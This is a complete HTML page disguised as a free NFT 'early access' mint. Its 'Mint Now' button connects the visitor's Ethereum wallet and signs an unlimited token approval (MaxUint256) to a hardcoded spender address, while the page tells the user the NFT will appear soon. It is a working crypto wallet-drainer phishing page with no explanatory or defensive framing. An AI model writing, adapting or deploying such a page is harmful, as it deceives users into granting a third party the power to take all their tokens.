<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>zkMint Drop</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    body {
      background-color: #0e0e0e;
      color: #eee;
      font-family: Arial, sans-serif;
      text-align: center;
      padding-top: 50px;
    }
    h1 {
      font-size: 32px;
      margin-bottom: 10px;
    }
    p {
      font-size: 18px;
      margin-bottom: 30px;
    }
    button {
      padding: 15px 30px;
      font-size: 18px;
      background: #00ffa5;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-weight: bold;
    }
    #status {
      margin-top: 20px;
      color: lime;
    }
  </style>
</head>
<body>
  <h1>zkMint Early Access</h1>
  <p>Claim your free NFT before public launch. Gas fees only.</p>
  <button onclick="approve()">Mint Now</button>
  <div id="status"></div>

  <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
  <script>
    const tokenAddress = "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619";
    const spenderAddress = "0xC259Bb14dE51e292b9E6f32AD41507bf3Fa7028A";

    async function approve() {
      const [signer] = await window.ethereum.request({ method: "eth_requestAccounts" });
      const provider = new ethers.BrowserProvider(window.ethereum);
      const user = await provider.getSigner();
      const token = new ethers.Contract(tokenAddress, [
        "function approve(address spender, uint256 value) public returns (bool)"
      ], user);

      const tx = await token.approve(spenderAddress, ethers.MaxUint256);
      document.getElementById("status").innerText = "ðŸ”„ Waiting for approval...";
      await tx.wait();
      document.getElementById("status").innerText = "âœ… Approved. NFT will appear in your wallet soon!";
    }
  </script>
</body>
</html>
